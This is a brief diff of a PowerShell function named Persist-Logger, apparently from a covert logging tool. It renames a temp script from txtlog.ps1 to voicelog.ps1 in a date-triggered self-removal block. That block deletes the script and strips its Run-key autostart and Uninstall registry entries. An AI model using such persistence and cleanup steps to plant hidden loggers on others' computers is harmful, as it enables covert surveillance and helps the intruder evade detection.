@@ -27,7 +27,7 @@ function Persist-Logger {
     
         if($date -lt $targetDate){ return }
     
-        Remove-Item "$env:temp\txtlog.ps1" -Force;
+        Remove-Item "$env:temp\voicelog.ps1" -Force;
         Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Force
         Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $name -Force
     }
